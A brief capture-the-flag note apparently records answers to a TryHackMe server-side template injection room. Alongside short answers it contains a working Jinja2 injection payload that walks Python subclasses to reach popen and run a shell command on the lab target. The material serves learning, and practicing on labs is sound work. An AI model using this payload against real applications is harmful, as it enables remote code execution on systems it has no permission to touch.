---
cssclasses: jbm-note
Date: 2026-05-17
tags:
  - THMChallenge
---
# File upload Challenge

| **Target**            | *Try hack me machine(room: learnssti)* |
| --------------------- | -------------------------------------- |
| Date                  | 17/5/2026                              |
| Main attack type      | SSTI                                   |
| Secondary attack type | Remote code execution (RCE)            |
| Tools:                | Burpsuite, NMAP, FUFF                  |
| Criticality:          | CVE **9.0**-**10.0**                   |

---
# **RESULTS**
---
## Question answers
- Task 2
	- `{{`
- Task 3
	- `jinja2`
- Task 4
	- `{#`
- Task 5
	- `jake`
```http
http://10.82.145.238:5000/profile/{{self.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('whoami').read() }}

```
- Task 8
	- `{{'7'*7}}`